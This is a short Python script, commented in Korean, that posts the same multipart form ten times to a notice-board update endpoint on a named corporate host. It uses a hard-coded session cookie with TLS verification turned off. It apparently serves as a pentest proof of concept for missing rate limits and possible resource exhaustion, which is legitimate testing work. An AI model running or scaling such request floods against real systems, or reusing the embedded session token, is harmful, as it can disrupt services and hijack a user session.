import requests
import time

URL = "https://omni.skshieldus.com:8443/board/updateBoard"
COOKIES = {
    "useCti": "Y",
    "fileDownload": "true",
    "JSESSIONID": "NWJjNGVlNTYtZDgzNy00MGE0LWE5MjYtNzkwOGQ5Y2Q5NjIw"
}

HEADERS = {
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept-Language": "ko-KR,ko;q=0.9",
    "Sec-Ch-Ua": '"Chromium";v="141", "Not?A_Brand";v="8"',
    "Sec-Ch-Ua-Mobile": "?0",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Origin": "https://omni.skshieldus.com:8443",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://omni.skshieldus.com:8443/board/boardPop?frmId=93c25188-87dc-4c3e-9a33-80862287d64a&popType=P",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i",
    "Connection": "keep-alive"
}

BOUNDARY = "----WebKitFormBoundary0YCRYiHE6XC2lLeH"
multipart_data = [
    ("isNew", "true"),
    ("isDisabled", "false"),
    ("startDt", ""),
    ("endDt", ""),
    ("unlimitedFlag", "Y"),
    ("noticeImp", "N"),
    ("noticeType", "03"),
    ("noticeCategory", ""),
    ("mallId", ""),
    ("targetTeam", "133"),
    ("title", "취약점진단 무재한 요청 허용 자동화 시스템 자원 고갈"),
    ("files", ""),
    ("createdNm", ""),
    ("createdDt", ""),
    ("updatedNm", ""),
    ("updatedDt", ""),
    ("file", ""),
    ("SBHE_col_1_checkbox_1762234902628", ""),
    ("SBHE_1762234902628_TempInput", ""),
    ("content", "hello"),
    ("projCd", "ISAC"),
    ("gb", "01"),
    ("targetType", "board"),
    ("userId", "520"),
    ("progPh", "/board/boardPop"),
    ("actNm", "공지사항")
]

VERIFY_SSL = False

DELAY = 1.0  #1초

def build_multipart_form_data():
    """멀티파트 폼 데이터 생성 (boundary 포함)"""
    body = []
    for name, value in multipart_data:
        body.append(f"--{BOUNDARY}")
        body.append(f'Content-Disposition: form-data; name="{name}"')
        body.append("")
        body.append(str(value))
    body.append(f"--{BOUNDARY}--")
    body.append("")
    return "\r\n".join(body).encode('utf-8')

def send_request():
    """한 번의 POST 요청 전송"""
    data = build_multipart_form_data()
    headers = HEADERS.copy()
    headers["Content-Type"] = f"multipart/form-data; boundary={BOUNDARY}"
    headers["Content-Length"] = str(len(data))

    try:
        response = requests.post(
            URL,
            headers=headers,
            cookies=COOKIES,
            data=data,
            verify=VERIFY_SSL,
            timeout=10
        )
        print(f"[+] 요청 성공 | 상태코드: {response.status_code}")
        if response.status_code == 200:
            print(f"    응답: {response.text[:200]}...")
        else:
            print(f"    오류: {response.text[:200]}...")
    except requests.exceptions.RequestException as e:
        print(f"[!] 요청 실패: {e}")

if __name__ == "__main__":
    print(f"POST 요청을 {URL} 로 10회 전송 시작...")
    print(f"Boundary: {BOUNDARY}")
    print(f"쿠키: JSESSIONID=...{COOKIES['JSESSIONID'][-10:]}")
    print("-" * 60)

    for i in range(1, 11):
        print(f"\n[{i}/10] 요청 전송 중...")
        send_request()
        if i < 10:
            print(f"    {DELAY}초 대기...")
            time.sleep(DELAY)

    print("\n" + "="*60)
    print("모든 요청 완료!")
